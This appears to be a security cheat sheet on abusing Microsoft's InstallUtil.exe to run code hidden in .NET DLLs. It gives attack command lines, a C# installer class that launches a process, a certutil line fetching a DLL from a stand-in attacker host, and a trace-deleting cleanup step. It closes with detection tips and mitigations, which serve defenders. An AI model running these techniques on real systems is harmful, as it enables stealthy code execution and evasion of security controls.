# 🧩 InstallUtil - Living Off the Land

**InstallUtil.exe** is a legitimate .NET Framework utility used to install and uninstall assemblies that contain installer components. Attackers abuse it to **execute custom code inside DLLs**, bypassing controls and triggering payloads without direct binary execution.

> ⚠️ Educational use only. InstallUtil is powerful and often abused in malware campaigns.

---

## 🛠️ What It Does
- Loads and executes methods in .NET assemblies (DLLs)
- Can be used to run code without invoking `rundll32`, `powershell`, or `.exe` files directly
- Trusted by the OS, signed by Microsoft

---

## 💣 Common LotL InstallUtil Techniques

### 1. Execute a Malicious .NET DLL
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /u C:\Users\Public\evil.dll
```
✅ Executes the `Uninstall` routine of `evil.dll` — code runs in memory

---

### 2. Obfuscate Execution Path (x64 Variant)
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /u payload.dll
```
✅ Useful on 64-bit systems — different path, same impact

---

### 3. Build DLL with Custom Installer Class
```csharp
[RunInstaller(true)]
public class EvilInstaller : Installer {
    public override void Uninstall(IDictionary savedState) {
        Process.Start("cmd.exe", "/c calc.exe");
    }
}
```
✅ Automatically runs payload when `InstallUtil /u` is called

---

### 4. Combine With Certutil to Drop DLL First
```cmd
certutil -urlcache -split -f http://attacker.com/evil.dll evil.dll
InstallUtil.exe /u evil.dll
```
✅ Drops + executes malicious DLL in-memory without .exe

---

### 5. Cleanup After Use
```cmd
InstallUtil.exe /u evil.dll & del evil.dll
```
✅ Clears disk trace after payload is executed

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| `InstallUtil.exe` run from temp/public paths | Alert on suspicious DLL paths |
| `/u` flag used without logs | Detect silent uninstall as a signal of abuse |
| Parent-child chains (e.g., browser → installutil) | Flag odd launching patterns |
| Assembly includes `Process.Start()` or reflective loaders | Inspect DLL code or dynamic behavior

---

## 🔐 Mitigation Strategies
- Restrict access to InstallUtil using AppLocker or Software Restriction Policies
- Alert on command-line use of InstallUtil with unknown or unsigned DLLs
- Monitor filesystem changes in DLL-heavy folders (e.g., `C:\Users\Public`, `%TEMP%`)
- Block DLLs with installer components that aren’t digitally signed

---

> 🧠 InstallUtil is stealthy, signed, and abused by malware like PlugX and APTs for lateral movement and fileless execution. Know it — and watch it.
